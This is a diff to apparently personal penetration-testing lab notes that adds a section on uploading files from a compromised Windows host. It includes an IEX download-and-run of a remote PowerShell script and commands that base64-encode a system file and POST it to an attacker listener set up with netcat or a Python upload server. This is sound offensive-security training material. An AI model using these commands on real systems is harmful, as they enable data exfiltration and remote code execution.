@@ -1,3 +1,4 @@
+# Download Operations
 
 ## 1) PowerShell Base64 Encode & Decode
 if you have access to terminal using a webshell you can 
@@ -102,4 +103,52 @@ ftp> bye
 
 C:\user>more file.txt
 This is a test file
+```
+
+# Upload Operations
+
+## 1) PowerShell Base64 Encode & Decode
+
+- encode file
+```powershell
+PS C:\user> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+PS C:\user> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+
+Hash
+----
+3688374325B992DEF12793500307566D
+```
+- paste it to decode
+```bash
+KiroMaged@htb[/htb]$ echo <base64>| base64 -d > hosts
+```
+
+## 2) PowerShell HTTP Upload
+
+### Invoke-FileUpload to Python Upload Server
+- listen 
+```bash
+$ python3 -m uploadserver 9999
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
+
+```
+-  send req
+```powershell
+PS C:\user> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\user> Invoke-FileUpload -Uri http://172.24.121.19:9999/upload -File C:\Windows\System32\drivers\etc\hosts
+
+```
+
+### PowerShell Base64 Web Upload
+- listen  
+```bash
+$  nc -lvnp 8000
+listening on [any] 8000 ...
+```
+-  send req
+```powershell
+PS C:\user> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\user> Invoke-WebRequest -Uri http://172.24.121.19:8000/ -Method POST -Body $b64
 ```
